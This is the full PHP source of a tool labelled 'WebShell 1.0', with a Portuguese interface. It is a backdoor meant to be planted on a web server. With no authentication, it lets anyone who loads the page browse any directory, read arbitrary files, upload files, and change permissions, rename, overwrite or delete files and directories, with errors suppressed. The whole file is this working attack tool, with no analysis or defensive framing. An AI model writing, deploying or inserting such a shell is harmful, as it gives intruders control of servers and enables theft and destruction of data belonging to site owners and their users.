<?php
set_time_limit(0);
error_reporting(0);

if(get_magic_quotes_gpc()){
    foreach($_POST as $chave=>$valor){
        $_POST[$chave] = stripslashes($valor);
    }
}
echo '<!DOCTYPE HTML>
<HTML>
<HEAD>
<link href="" rel="stylesheet" type="text/css">
<title>WebShell</title>
<style>
body{
font-family: "Racing Sans One", cursive;
background-color: #e6e6e6;
text-shadow:0px 0px 1px #757575;
}
#content tr:hover{
background-color: #636263;
text-shadow:0px 0px 10px #fff;
}
#content .primeira{
background-color: silver;
}
#content .primeira:hover{
background-color: silver;
text-shadow:0px 0px 1px #757575;
}
table{
border: 1px #000000 dotted;
}
H1{
font-family: "Rye", cursive;
}
a{
color: #000;
text-decoration: none;
}
a:hover{
color: #fff;
text-shadow:0px 0px 10px #ffffff;
}
input,select,textarea{
border: 1px #000000 solid;
-moz-border-radius: 5px;
-webkit-border-radius:5px;
border-radius:5px;
}
</style>
</HEAD>
<BODY>
<H1><center><img src="https://s.yimg.com/lq/i/mesg/emoticons7/19.gif"/>
 WebShell <img src="https://s.yimg.com/lq/i/mesg/emoticons7/19.gif"/>
 </center></H1>
<table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
<tr><td>Diretório : ';
if(isset($_GET['caminho'])){
    $caminho = $_GET['caminho'];
}else{
    $caminho = getcwd();
}

$caminho = str_replace('\\','/',$caminho);
$caminhos = explode('/',$caminho);

foreach($caminhos as $id=>$pat){
    if($pat == '' && $id == 0){
        $a = true;
        echo '<a href="?caminho=/">/</a>';
        continue;
    }
    if($pat == '') continue;
    echo '<a href="?caminho=';
    for($i=0;$i<=$id;$i++){
        echo "$caminhos[$i]";
        if($i != $id) echo "/";
    }
    echo '">'.$pat.'</a>/';
}
echo '</td></tr><tr><td>';
if(isset($_FILES['arquivo'])){
    if(copy($_FILES['arquivo']['tmp_name'],$caminho.'/'.$_FILES['arquivo']['name'])){
        echo '<font color="green">Arquivo enviado com sucesso :* </font><br />';
    }else{
        echo '<font color="red">Falha ao enviar, por favor, tente novamente. <img src="http://c.fastcompany.net/asset_files/-/2014/11/11/4F4.gif"/>
        </font><br />';
    }
}
echo '<form enctype="multipart/form-data" method="POST">
Enviar Arquivo : <input type="file" name="arquivo" />
<input type="submit" value="Enviar" />
</form>
</td></tr>';
if(isset($_GET['arquivo'])){
    echo "<tr><td>Arquivo Atual : ";
    echo $_GET['arquivo'];
    echo '</tr></td></table><br />';
    echo('<pre>'.htmlspecialchars(file_get_contents($_GET['arquivo'])).'</pre>');
}elseif(isset($_GET['opcao']) && $_POST['opt'] != 'delete'){
    echo '</table><br /><center>'.$_POST['caminho'].'<br /><br />';
    if($_POST['opt'] == 'chmod'){
        if(isset($_POST['perm'])){
            if(chmod($_POST['caminho'],$_POST['perm'])){
                echo '<font color="green">Permissão alterada com sucesso.</font><br />';
            }else{
                echo '<font color="red">Erro ao alterar permissão.</font><br />';
            }
        }
        echo '<form method="POST">
        Permissão : <input name="perm" type="text" size="4" value="'.substr(sprintf('%o', fileperms($_POST['caminho'])), -4).'" />
        <input type="hidden" name="caminho" value="'.$_POST['caminho'].'">
        <input type="hidden" name="opt" value="chmod">
        <input type="submit" value="Ir" />
        </form>';
    }elseif($_POST['opt'] == 'renomear'){
        if(isset($_POST['novo_nome'])){
            if(rename($_POST['caminho'],$caminho.'/'.$_POST['novo_nome'])){
                echo '<font color="green">Nome alterado com sucesso.</font><br />';
            }else{
                echo '<font color="red">Erro ao alterar nome.</font><br />';
            }
            $_POST['nome'] = $_POST['novo_nome'];
        }
        echo '<form method="POST">
        Novo Nome : <input name="novo_nome" type="text" size="20" value="'.$_POST['nome'].'" />
        <input type="hidden" name="caminho" value="'.$_POST['caminho'].'">
        <input type="hidden" name="opt" value="renomear">
        <input type="submit" value="Ir" />
        </form>';
    }elseif($_POST['opt'] == 'editar'){
        if(isset($_POST['src'])){
            $fp = fopen($_POST['caminho'],'w');
            if(fwrite($fp,$_POST['src'])){
                echo '<font color="green">Arquivo editado com sucesso ~_^.</font><br />';
            }else{
                echo '<font color="red">Erro ao editar arquivo ~_~.</font><br />';
            }
            fclose($fp);
        }
        echo '<form method="POST">
        <textarea cols=80 rows=20 name="src">'.htmlspecialchars(file_get_contents($_POST['caminho'])).'</textarea><br />
        <input type="hidden" name="caminho" value="'.$_POST['caminho'].'">
        <input type="hidden" name="opt" value="editar">
        <input type="submit" value="Ir" />
        </form>';
    }
    echo '</center>';
}else{
    echo '</table><br /><center>';
    if(isset($_GET['opcao']) && $_POST['opt'] == 'delete'){
        if($_POST['tipo'] == 'dir'){
            if(rmdir($_POST['caminho'])){
                echo '<font color="green">Diretório excluído com sucesso.</font><br />';
            }else{
                echo '<font color="red">Erro ao excluir diretório.</font><br />';
            }
        }elseif($_POST['tipo'] == 'arquivo'){
            if(unlink($_POST['caminho'])){
                echo '<font color="green">Arquivo excluído com sucesso.</font><br />';
            }else{
                echo '<font color="red">Erro ao excluir arquivo.</font><br />';
            }
        }
    }
    echo '</center>';
    $scandir = scandir($caminho);
    echo '<div id="content"><table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
    <tr class="primeira">
    <td><center>Nome</center></td>
    <td><center>Tamanho</center></td>
    <td><center>Permissões</center></td>
    <td><center>Opções</center></td>
    </tr>';

    foreach($scandir as $dir){
        if(!is_dir("$caminho/$dir") || $dir == '.' || $dir == '..') continue;
        echo "<tr>
        <td><a href=\"?caminho=$caminho/$dir\">$dir</a></td>
        <td><center>--</center></td>
        <td><center>";
        if(is_writable("$caminho/$dir")) echo '<font color="green">';
        elseif(!is_readable("$caminho/$dir")) echo '<font color="red">';
        echo perms("$caminho/$dir");
        if(is_writable("$caminho/$dir") || !is_readable("$caminho/$dir")) echo '</font>';

        echo "</center></td>
        <td><center><form method=\"POST\" action=\"?opcao&caminho=$caminho\">
        <select name=\"opt\">
        <option value=\"\"></option>
        <option value=\"delete\">Excluir</option>
        <option value=\"chmod\">Alterar Permissões</option>
        <option value=\"renomear\">Renomear</option>
        </select>
        <input type=\"hidden\" name=\"tipo\" value=\"dir\">
        <input type=\"hidden\" name=\"nome\" value=\"$dir\">
        <input type=\"hidden\" name=\"caminho\" value=\"$caminho/$dir\">
        <input type=\"submit\" value=\">\" />
        </form></center></td>
        </tr>";
    }
    echo '<tr class="primeira"><td></td><td></td><td></td><td></td></tr>';
    foreach($scandir as $arquivo){
        if(!is_file("$caminho/$arquivo")) continue;
        $tamanho = filesize("$caminho/$arquivo")/1024;
        $tamanho = round($tamanho,3);
        if($tamanho >= 1024){
            $tamanho = round($tamanho/1024,2).' MB';
        }else{
            $tamanho = $tamanho.' KB';

        }

        echo "<tr>
        <td><a href=\"?arquivo=$caminho/$arquivo&caminho=$caminho\">$arquivo</a></td>
        <td><center>".$tamanho."</center></td>
        <td><center>";
        if(is_writable("$caminho/$arquivo")) echo '<font color="green">';
        elseif(!is_readable("$caminho/$arquivo")) echo '<font color="red">';
        echo perms("$caminho/$arquivo");
        if(is_writable("$caminho/$arquivo") || !is_readable("$caminho/$arquivo")) echo '</font>';
        echo "</center></td>
        <td><center><form method=\"POST\" action=\"?opcao&caminho=$caminho\">
        <select name=\"opt\">
        <option value=\"\"></option>
        <option value=\"delete\">Excluir</option>
        <option value=\"chmod\">Alterar Permissões</option>
        <option value=\"renomear\">Renomear</option>
        <option value=\"editar\">Editar</option>
        </select>
        <input type=\"hidden\" name=\"tipo\" value=\"arquivo\">
        <input type=\"hidden\" name=\"nome\" value=\"$arquivo\">
        <input type=\"hidden\" name=\"caminho\" value=\"$caminho/$arquivo\">
        <input type=\"submit\" value=\">\" />
        </form></center></td>
        </tr>";
    }
    echo '</table>
    </div>';
}
echo '<center><br />WebShell <font color="green">1.0</font></center>
</BODY>
</HTML>';
function perms($arquivo){
    $perms = fileperms($arquivo);

    if (($perms & 0xC000) == 0xC000) {
        $info = 's';
    } elseif (($perms & 0xA000) == 0xA000) {
        $info = 'l';
    } elseif (($perms & 0x8000) == 0x8000) {
        $info = '-';
    } elseif (($perms & 0x6000) == 0x6000) {
        $info = 'b';
    } elseif (($perms & 0x4000) == 0x4000) {
        $info = 'd';
    } elseif (($perms & 0x2000) == 0x2000) {
        $info = 'c';
    } elseif (($perms & 0x1000) == 0x1000) {
        $info = 'p';
    } else {
        $info = 'u';
    }

    $info .= (($perms & 0x0100) ? 'r' : '-');
    $info .= (($perms & 0x0080) ? 'w' : '-');
    $info .= (($perms & 0x0040) ?
    (($perms & 0x0800) ? 's' : 'x' ) :
    (($perms & 0x0800) ? 'S' : '-'));

    $info .= (($perms & 0x0020) ? 'r' : '-');
    $info .= (($perms & 0x0010) ? 'w' : '-');
    $info .= (($perms & 0x0008) ?
    (($perms & 0x0400) ? 's' : 'x' ) :
    (($perms & 0x0400) ? 'S' : '-'));

    $info .= (($perms & 0x0004) ? 'r' : '-');
    $info .= (($perms & 0x0002) ? 'w' : '-');

    $info .= (($perms & 0x0001) ?
    (($perms & 0x0200) ? 't' : 'x' ) :
    (($perms & 0x0200) ? 'T' : '-'));

    return $info;
}
?>
